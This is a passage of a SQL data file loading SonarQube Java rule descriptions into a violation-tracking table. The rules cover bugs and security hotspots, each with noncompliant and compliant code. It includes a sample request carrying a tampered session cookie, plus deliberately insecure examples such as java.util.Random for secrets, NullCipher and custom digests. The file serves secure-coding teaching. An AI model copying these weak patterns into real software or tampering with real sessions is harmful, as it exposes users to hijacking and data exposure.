      <td> MANDATORY, NESTED, REQUIRED, REQUIRES_NEW </td>
    </tr>
    <tr>
      <td> REQUIRED or <code>@Transactional</code> </td>
      <td> NESTED, NEVER, NOT_SUPPORTED, REQUIRES_NEW </td>
    </tr>
    <tr>
      <td> REQUIRES_NEW </td>
      <td> NESTED, NEVER, NOT_SUPPORTED, REQUIRES_NEW </td>
    </tr>
    <tr>
      <td> SUPPORTS </td>
      <td> MANDATORY, NESTED, NEVER, NOT_SUPPORTED, REQUIRED, REQUIRES_NEW </td>
    </tr>
  </tbody>
</table>
<h2>Noncompliant Code Example</h2>
<pre>

@Override
public void doTheThing() {
  // ...
  actuallyDoTheThing();  // Noncompliant
}

@Override
@Transactional
public void actuallyDoTheThing() {
  // ...
}
</pre>', 'java', 'READY', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2230', 'Non-public methods should not be "@Transactional"', 'sonarqube', 'Bug', '<p>Marking a non-public method <code>@Transactional</code> is both useless and misleading because Spring doesn''t "see" non-<code>public</code>
methods, and so makes no provision for their proper invocation. Nor does Spring make provision for the methods invoked by the method it called.</p>
<p>Therefore marking a <code>private</code> method, for instance, <code>@Transactional</code> can only result in a runtime error or exception if the
method is actually written to be <code>@Transactional</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@Transactional  // Noncompliant
private void doTheThing(ArgClass arg) {
  // ...
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2232', '"ResultSet.isLast()" should not be used', 'sonarqube', 'Code Smell', '<p>There are several reasons to avoid <code>ResultSet.isLast()</code>. First, support for this method is optional for <code>TYPE_FORWARD_ONLY</code>
result sets. Second, it can be expensive (the driver may need to fetch the next row to answer the question). Finally, the specification is not clear
on what should be returned when the <code>ResultSet</code> is empty, so some drivers may return the opposite of what is expected.</p>
<h2>Noncompliant Code Example</h2>
<pre>
stmt.executeQuery("SELECT name, address FROM PERSON");
ResultSet rs = stmt.getResultSet();
while (! rs.isLast()) { // Noncompliant
  // process row
}
</pre>
<h2>Compliant Solution</h2>
<pre>
ResultSet rs = stmt.executeQuery("SELECT name, address FROM PERSON");
while (rs.next()) {
  // process row
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2234', 'Parameters should be passed in the correct order', 'sonarqube', 'Code Smell', '<p>When the names of parameters in a method call match the names of the method arguments, it contributes to clearer, more readable code. However, when
the names match, but are passed in a different order than the method arguments, it indicates a mistake in the parameter order which will likely lead
to unexpected results.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public double divide(int divisor, int dividend) {
  return divisor/dividend;
}

public void doTheThing() {
  int divisor = 15;
  int dividend = 5;

  double result = divide(dividend, divisor);  // Noncompliant; operation succeeds, but result is unexpected
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public double divide(int divisor, int dividend) {
  return divisor/dividend;
}

public void doTheThing() {
  int divisor = 15;
  int dividend = 5;

  double result = divide(divisor, dividend);
  //...
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2235', 'IllegalMonitorStateException should not be caught', 'sonarqube', 'Code Smell', '<p>According to Oracle Javadoc:</p>
<blockquote>
  <p><code>IllegalMonitorStateException</code> is thrown when a thread has attempted to wait on an object''s monitor or to notify other threads waiting
  on an object''s monitor without owning the specified monitor.</p>
</blockquote>
<p>In other words, this exception can be thrown only in case of bad design because <code>Object.wait(...)</code>, <code>Object.notify()</code> and
<code>Object.notifyAll()</code> methods should never be called on an object whose monitor is not held. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomething(){
  ...
  try {
    ...
    anObject.notify();
    ...
  } catch(IllegalMonitorStateException e) {
    ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething(){
  ...
  synchronized(anObject) {
    ...
    anObject.notify();
    ...
  }
}
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2236', 'Methods "wait(...)", "notify()" and "notifyAll()" should not be called on Thread instances', 'sonarqube', 'Bug', '<p>The methods <code>wait(...)</code>, <code>notify()</code> and <code>notifyAll()</code> are available on a <code>Thread</code> instance, but only
because all classes in Java extend <code>Object</code> and therefore automatically inherit those methods. But there are two very good reasons for not
calling them on a <code>Thread</code>:</p>
<ul>
  <li> Internally, the JVM relies on these methods to change the state of the Thread (<code>BLOCKED</code>, <code>WAITING</code>, ...), so calling
  them will corrupt the behavior of the JVM. </li>
  <li> It is not clear (perhaps even to the original coder) what is really expected. For instance, it is waiting for the execution of the Thread to
  suspended, or is it the acquisition of the object monitor that is waited for? </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
Thread myThread = new Thread(new RunnableJob());
...
myThread.wait(2000);
</pre>', 'java', 'READY', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2245', 'Using pseudorandom number generators (PRNGs) is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6386">CVE-2013-6386</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3419">CVE-2006-3419</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4102">CVE-2008-4102</a> </li>
</ul>
<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that
will be generated, and use this guess to impersonate another user or access sensitive information.</p>
<p>As the <code>java.util.Random</code> class relies on a pseudorandom number generator, this class and relating <code>java.lang.Math.random()</code>
method should not be used for security-critical applications or for protecting sensitive data. In such context, the
<code>java.security.SecureRandom</code> class which relies on a cryptographically strong random number generator (RNG) should be used in place.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such
  as a password, is hashed. </li>
  <li> the function you use generates a value which can be predicted (pseudo-random). </li>
  <li> the generated value is used multiple times. </li>
  <li> an attacker can access the generated value. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use a cryptographically strong random number generator (RNG) like "java.security.SecureRandom" in place of this PRNG. </li>
  <li> Use the generated random values only once. </li>
  <li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
Random random = new Random(); // Sensitive use of Random
byte bytes[] = new byte[20];
random.nextBytes(bytes); // Check if bytes is used for hashing, encryption, etc...
</pre>
<h2>Compliant Solution</h2>
<pre>
SecureRandom random = new SecureRandom(); // Compliant for security-sensitive use cases
byte bytes[] = new byte[20];
random.nextBytes(bytes);
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/338.html">MITRE, CWE-338</a> - Use of Cryptographically Weak Pseudo-Random Number Generator
  (PRNG) </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/330.html">MITRE, CWE-330</a> - Use of Insufficiently Random Values </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/326.html">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/oTdGBQ">CERT, MSC02-J.</a> - Generate strong random numbers </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/UNcxBQ">CERT, MSC30-C.</a> - Do not use the rand() function for generating pseudorandom numbers
  </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/2ns-BQ">CERT, MSC50-CPP.</a> - Do not use std::rand() for generating pseudorandom numbers </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM">Predictable Pseudo Random Number
  Generator</a> </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2250', 'Collection methods with O(n) performance should be used carefully', 'sonarqube', 'Code Smell', '<p>The time complexity of method calls on collections is not always obvious. For instance, for most collections the <code>size()</code> method takes
constant time, but the time required to execute <code>ConcurrentLinkedQueue.size()</code> is O(n), i.e. directly proportional to the number of
elements in the collection. When the collection is large, this could therefore be an expensive operation. </p>
<p>This rule raises an issue when the following O(n) methods are called outside of constructors on class fields:</p>
<ul>
  <li> <code>ArrayList</code>
    <ul>
      <li> <code>contains</code> </li>
      <li> <code>remove</code> </li>
    </ul> </li>
  <li> <code>LinkedList</code>
    <ul>
      <li> <code>get</code> </li>
      <li> <code>contains</code> </li>
    </ul> </li>
  <li> <code>ConcurrentLinkedQueue</code>
    <ul>
      <li> <code>size</code> </li>
      <li> <code>contains</code> </li>
    </ul> </li>
  <li> <code>ConcurrentLinkedDeque</code>
    <ul>
      <li> <code>size</code> </li>
      <li> <code>contains</code> </li>
    </ul> </li>
  <li> <code>CopyOnWriteArrayList</code>
    <ul>
      <li> <code>add</code> </li>
      <li> <code>contains</code> </li>
      <li> <code>remove</code> </li>
    </ul> </li>
  <li> <code>CopyOnWriteArraySet</code>
    <ul>
      <li> <code>add</code> </li>
      <li> <code>contains</code> </li>
      <li> <code>remove</code> </li>
    </ul> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
ConcurrentLinkedQueue queue = new ConcurrentLinkedQueue();
//...
log.info("Queue contains " + queue.size() + " elements");  // Noncompliant
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2251', 'A "for" loop update clause should move the counter in the right direction', 'sonarqube', 'Bug', '<p>A <code>for</code> loop with a counter that moves in the wrong direction is not an infinite loop. Because of wraparound, the loop will eventually
reach its stop condition, but in doing so, it will run many, many more times than anticipated, potentially causing unexpected behavior. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomething(String [] strings) {
  for (int i = 0; i &lt; strings.length; i--) { // Noncompliant;
    String string = strings[i];  // ArrayIndexOutOfBoundsException when i reaches -1
    //...
  }
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething(String [] strings) {
  for (int i = 0; i &lt; strings.length; i++) {
    String string = strings[i];
    //...
  }
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/aTdGBQ">CERT, MSC54-J.</a> - Avoid inadvertent wrapping of loop counters </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2252', 'Loop conditions should be true at least once', 'sonarqube', 'Bug', '<p>If a <code>for</code> loop''s condition is false before the first loop iteration, the loop will never be executed. Such loops are almost always
bugs, particularly when the initial value and stop conditions are hard-coded.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (int i = 10; i &lt; 10; i++) {  // Noncompliant
  // ...
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2254', '"HttpServletRequest.getRequestedSessionId()" should not be used', 'sonarqube', 'Vulnerability', '<p>According to the Oracle Java API, the <code>HttpServletRequest.getRequestedSessionId()</code> method:</p>
<blockquote>
  <p>Returns the session ID specified by the client. This may not be the same as the ID of the current valid session for this request. If the client
  did not specify a session ID, this method returns null.</p>
</blockquote>
<p>The session ID it returns is either transmitted in a cookie or a URL parameter so by definition, nothing prevents the end-user from manually
updating the value of this session ID in the HTTP request. </p>
<p>Here is an example of a updated HTTP header:</p>
<pre>
GET /pageSomeWhere HTTP/1.1
Host: webSite.com
User-Agent: Mozilla/5.0
Cookie: JSESSIONID=Hacked_Session_Value''''''"&gt;
</pre>
<p>Due to the ability of the end-user to manually change the value, the session ID in the request should only be used by a servlet container (E.G.
Tomcat or Jetty) to see if the value matches the ID of an an existing session. If it does not, the user should be considered unauthenticated.
Moreover, this session ID should never be logged as is but using a one-way hash to prevent hijacking of active sessions.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if(isActiveSession(request.getRequestedSessionId()) ){
  ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication">OWASP Top 10 2017 Category A2</a> - Broken Authentication </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/807">MITRE, CWE-807</a> - Reliance on Untrusted Inputs in a Security Decision </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2255', 'Writing cookies is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>Using cookies is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11639">CVE-2018-11639</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6537">CVE-2016-6537</a> </li>
</ul>
<p>Attackers can use widely-available tools to read cookies. Any sensitive information they may contain will be exposed.</p>
<p>This rule flags code that writes cookies.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> sensitive information is stored inside the cookie. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Cookies should only be used to manage the user session. The best practice is to keep all user-related information server-side and link them to the
user session, never sending them to the client. In a very few corner cases, cookies can be used for non-sensitive information that need to live longer
than the user session.</p>
<p>Do not try to encode sensitive information in a non human-readable format before writing them in a cookie. The encoding can be reverted and the
original information will be exposed.</p>
<p>Using cookies only for session IDs doesn''t make them secure. Follow <a
href="https://www.owasp.org/index.php/Session_Management_Cheat_Sheet#Cookies">OWASP best practices</a> when you configure your cookies.</p>
<p>As a side note, every information read from a cookie should be <a
href="https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet">Sanitized</a>.</p>
<h2>Sensitive Code Example</h2>
<pre>
// === javax.servlet ===
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpServletRequest;

public class JavaxServlet {
    void aServiceMethodSettingCookie(HttpServletRequest request, HttpServletResponse response, String acctID) {
        Cookie cookie = new Cookie("userAccountID", acctID);  // Sensitive
        response.addCookie(cookie);  // Sensitive
    }
}
</pre>
<pre>
// === javax.ws ===
import java.util.Date;
import javax.ws.rs.core.Cookie;
import javax.ws.rs.core.NewCookie;

class JavaxWs {
    void jaxRsCookie(String comment, int maxAge, boolean secure, Date expiry, boolean httpOnly, String name,
            String value, String path, String domain, int version) {
        Cookie cookie= new Cookie("name", "value");  // Sensitive

        new NewCookie(cookie);  // Sensitive
        new NewCookie(cookie, comment, maxAge, secure);  // Sensitive
        new NewCookie(cookie, comment, maxAge, expiry, secure, httpOnly);  // Sensitive
        new NewCookie(name, value);  // Sensitive
        new NewCookie(name, value, path, domain, version, comment, maxAge, secure);  // Sensitive
        new NewCookie(name, value, path, domain, version, comment, maxAge, expiry, secure, httpOnly);  // Sensitive
        new NewCookie(name, value, path, domain, comment, maxAge, secure);  // Sensitive
        new NewCookie(name, value, path, domain, comment, maxAge, secure, httpOnly);  // Sensitive
    }
}
</pre>
<pre>
// === java.net ===
import java.net.HttpCookie;

class JavaNet {
    void httpCookie(HttpCookie hc) {
        HttpCookie cookie = new HttpCookie("name", "value");  // Sensitive
        cookie.setValue("value");  // Sensitive
    }
}
</pre>
<pre>
// === apache.shiro ===
import org.apache.shiro.web.servlet.SimpleCookie;

class ApacheShiro {

    void shiroCookie(SimpleCookie cookie) {
        SimpleCookie sc = new SimpleCookie(cookie);  // Sensitive
        cookie.setValue("value");  // Sensitive
    }
}
</pre>
<pre>
// === Play ===
import play.mvc.Http.Cookie;
import play.mvc.Http.CookieBuilder;


class Play {
    void playCookie() {
        CookieBuilder builder = Cookie.builder("name", "value");  // Sensitive
        builder.withName("name")
          .withValue("value")  // Sensitive
          .build();

    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/312.html">MITRE, CWE-312</a> - Cleartext Storage of Sensitive Information </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/315.html">MITRE, CWE-315</a> - Cleartext Storage of Sensitive Information in a Cookie </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/display/java/FIO52-J.+Do+not+store+unencrypted+sensitive+information+on+the+client+side">CERT,
  FIO52-J.</a> - Do not store unencrypted sensitive information on the client side </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#COOKIE_USAGE">COOKIE_USAGE</a> </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>', 'java', 'DEPRECATED', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2257', 'Using non-standard cryptographic algorithms is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>The use of a non-standard algorithm is dangerous because a determined attacker may be able to break the algorithm and compromise whatever data has
been protected. Standard algorithms like <code>SHA-256</code>, <code>SHA-384</code>, <code>SHA-512</code>, ... should be used instead.</p>
<p>This rule tracks creation of <code>java.security.MessageDigest</code> subclasses.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use a standard algorithm instead of creating a custom one. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
public class MyCryptographicAlgorithm extends MessageDigest {
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
MessageDigest digest = MessageDigest.getInstance("SHA-256");
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/327.html">CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#CUSTOM_MESSAGE_DIGEST">MessageDigest is Custom</a>
  </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2258', '"javax.crypto.NullCipher" should not be used for anything other than testing', 'sonarqube', 'Vulnerability', '<p>By contract, the <code>NullCipher</code> class provides an "identity cipher" - one that does not transform or encrypt the plaintext in any way. As
a consequence, the ciphertext is identical to the plaintext. So this class should be used for testing, and never in production code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
NullCipher nc = new NullCipher();
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/327.html">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated; use <a href=''/coding_rules#rule_key=java%3AS5547''>S5547</a> instead.</p>', 'java', 'DEPRECATED', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2259', 'Null pointers should not be dereferenced', 'sonarqube', 'Bug', '<p>A reference to <code>null</code> should never be dereferenced/accessed. Doing so will cause a <code>NullPointerException</code> to be thrown. At
best, such an exception will cause abrupt program termination. At worst, it could expose debugging information that would be useful to an attacker, or
it could allow an attacker to bypass security measures.</p>
<p>Note that when they are present, this rule takes advantage of <code>@CheckForNull</code> and <code>@Nonnull</code> annotations defined in <a
href="https://jcp.org/en/jsr/detail?id=305">JSR-305</a> to understand which values are and are not nullable except when <code>@Nonnull</code> is used
on the parameter to <code>equals</code>, which by contract should always work with null.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@CheckForNull
String getName(){...}

public boolean isNameEmpty() {
  return getName().length() == 0; // Noncompliant; the result of getName() could be null, but isn''t null-checked
}
</pre>
<pre>
Connection conn = null;
Statement stmt = null;
try{
  conn = DriverManager.getConnection(DB_URL,USER,PASS);
  stmt = conn.createStatement();
  // ...

}catch(Exception e){
  e.printStackTrace();
}finally{
  stmt.close();   // Noncompliant; stmt could be null if an exception was thrown in the try{} block
  conn.close();  // Noncompliant; conn could be null if an exception was thrown
}
</pre>
<pre>
private void merge(@Nonnull Color firstColor, @Nonnull Color secondColor){...}

public  void append(@CheckForNull Color color) {
    merge(currentColor, color);  // Noncompliant; color should be null-checked because merge(...) doesn''t accept nullable parameters
}
</pre>
<pre>
void paint(Color color) {
  if(color == null) {
    System.out.println("Unable to apply color " + color.toString());  // Noncompliant; NullPointerException will be thrown
    return;
  }
  ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://cwe.mitre.org/data/definitions/476.html">MITRE, CWE-476</a> - NULL Pointer Dereference </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/QdcxBQ">CERT, EXP34-C.</a> - Do not dereference null pointers </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/aDdGBQ">CERT, EXP01-J.</a> - Do not use a null in a case where an object is required </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2260', 'Java parser failure', 'sonarqube', 'Code Smell', '<p>When the Java parser fails, it is possible to record the failure as a violation on the file. This way, not only it is possible to track the number
of files that do not parse but also to easily find out why they do not parse.</p>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2272', '"Iterator.next()" methods should throw "NoSuchElementException"', 'sonarqube', 'Bug', '<p>By contract, any implementation of the <code>java.util.Iterator.next()</code> method should throw a <code>NoSuchElementException</code> exception
when the iteration has no more elements. Any other behavior when the iteration is done could lead to unexpected behavior for users of this
<code>Iterator</code>. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyIterator implements Iterator&lt;String&gt;{
  ...
  public String next(){
    if(!hasNext()){
      return null;
    }
    ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyIterator implements Iterator&lt;String&gt;{
  ...
  public String next(){
    if(!hasNext()){
      throw new NoSuchElementException();
    }
    ...
  }
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2273', '"wait", "notify" and "notifyAll" should only be called when a lock is obviously held on an object', 'sonarqube', 'Bug', '<p>By contract, the method <code>Object.wait(...)</code>, <code>Object.notify()</code> and <code>Object.notifyAll()</code> should be called by a
thread that is the owner of the object''s monitor. If this is not the case an <code>IllegalMonitorStateException</code> exception is thrown. This rule
reinforces this constraint by making it mandatory to call one of these methods only inside a <code>synchronized</code> method or statement. </p>
<h2>Noncompliant Code Example</h2>
<pre>
private void removeElement() {
  while (!suitableCondition()){
    obj.wait();
  }
  ... // Perform removal
}
</pre>
<p>or</p>
<pre>
private void removeElement() {
  while (!suitableCondition()){
    wait();
  }
  ... // Perform removal
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private void removeElement() {
  synchronized(obj) {
    while (!suitableCondition()){
      obj.wait();
    }
    ... // Perform removal
  }
}
</pre>
<p>or</p>
<pre>
private synchronized void removeElement() {
  while (!suitableCondition()){
    wait();
  }
  ... // Perform removal
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2274', '"Object.wait(...)" and "Condition.await(...)" should be called inside a "while" loop', 'sonarqube', 'Code Smell', '<p>According to the documentation of the Java <code>Condition</code> interface:</p>
<blockquote>
  <p>When waiting upon a <code>Condition</code>, a "spurious wakeup" is permitted to occur, in general, as a concession to the underlying platform
  semantics. This has little practical impact on most application programs as a Condition should always be waited upon in a loop, testing the state
  predicate that is being waited for. An implementation is free to remove the possibility of spurious wakeups but it is recommended that applications
  programmers always assume that they can occur and so always wait in a loop.</p>
</blockquote>
<p>The same advice is also found for the <code>Object.wait(...)</code> method:</p>
<blockquote>
  <p>waits should always occur in loops, like this one:</p>
  <pre>
synchronized (obj) {
  while (&lt;condition does not hold&gt;){
    obj.wait(timeout);
  }
   ... // Perform action appropriate to condition
}
</pre>
</blockquote>
<h2>Noncompliant Code Example</h2>
<pre>
synchronized (obj) {
  if (!suitableCondition()){
    obj.wait(timeout);   //the thread can wake up even if the condition is still false
  }
   ... // Perform action appropriate to condition
}
</pre>
<h2>Compliant Solution</h2>
<pre>
synchronized (obj) {
  while (!suitableCondition()){
    obj.wait(timeout);
  }
   ... // Perform action appropriate to condition
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/EzdGBQ">CERT THI03-J.</a> - Always invoke wait() and await() methods inside a loop </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2275', 'Printf-style format strings should not lead to unexpected behavior at runtime', 'sonarqube', 'Bug', '<p>Because <code>printf</code>-style format strings are interpreted at runtime, rather than validated by the Java compiler, they can contain errors
that lead to unexpected behavior or runtime errors. This rule statically validates the good behavior of <code>printf</code>-style formats when calling
the <code>format(...)</code> methods of <code>java.util.Formatter</code>, <code>java.lang.String</code>, <code>java.io.PrintStream</code>,
<code>MessageFormat</code>, and <code>java.io.PrintWriter</code> classes and the <code>printf(...)</code> methods of <code>java.io.PrintStream</code>
or <code>java.io.PrintWriter</code> classes. </p>
<h2>Noncompliant Code Example</h2>
<pre>
String.format("The value of my integer is %d", "Hello World");  // Noncompliant; an ''int'' is expected rather than a String
String.format("Duke''s Birthday year is %tX", c);  //Noncompliant; X is not a supported time conversion character
String.format("Display %0$d and then %d", 1);   //Noncompliant; arguments are numbered starting from 1
String.format("Not enough arguments %d and %d", 1);  //Noncompliant; the second argument is missing
String.format("%&lt; is equals to %d", 2);   //Noncompliant; the argument index ''&lt;'' refers to the previous format specifier but there isn''t one

MessageFormat.format("Result {1}.", value); // Noncompliant; Not enough arguments. (first element is {0})
MessageFormat.format("Result {{0}.", value); // Noncompliant; Unbalanced number of curly brace (single curly braces should be escaped)
MessageFormat.format("Result '' {0}", value); // Noncompliant; Unbalanced number of quotes (single quote must be escaped)

java.util.logging.Logger logger;
logger.log(java.util.logging.Level.SEVERE, "Result {1}!", 14); // Noncompliant - Not enough arguments.

org.slf4j.Logger slf4jLog;
org.slf4j.Marker marker;

slf4jLog.debug(marker, "message {}"); // Noncompliant - Not enough arguments.

org.apache.logging.log4j.Logger log4jLog;
log4jLog.debug("message {}"); // Noncompliant - Not enough arguments.
</pre>
<h2>Compliant Solution</h2>
<pre>
String.format("The value of my integer is %d", 3);
String.format("Duke''s Birthday year is %tY", c);
String.format("Display %1$d and then %d", 1);
String.format("Not enough arguments %d and %d", 1, 2);
String.format("%d is equals to %&lt;", 2);

MessageFormat.format("Result {0}.", value);
MessageFormat.format("Result {0} &amp; {1}.", value, value);
MessageFormat.format("Result {0}.", myObject);

java.util.logging.Logger logger;
logger.log(java.util.logging.Level.SEVERE, "Result {1},{2}!", 14, 2);

org.slf4j.Logger slf4jLog;
org.slf4j.Marker marker;

slf4jLog.debug(marker, "message {}", 1);

org.apache.logging.log4j.Logger log4jLog;
log4jLog.debug("message {}", 1);
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/wQA1">CERT, FIO47-C.</a> - Use valid format strings </li>
</ul>', 'java', 'READY', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2276', '"wait(...)" should be used instead of "Thread.sleep(...)" when a lock is held', 'sonarqube', 'Bug', '<p>If <code>Thread.sleep(...)</code> is called when the current thread holds a lock, it could lead to performance and scalability issues, or even
worse to deadlocks because the execution of the thread holding the lock is frozen. It''s better to call <code>wait(...)</code> on the monitor object to
temporarily release the lock and allow other threads to run.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomething(){
  synchronized(monitor) {
    while(notReady()){
      Thread.sleep(200);
    }
    process();
  }
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething(){
  synchronized(monitor) {
    while(notReady()){
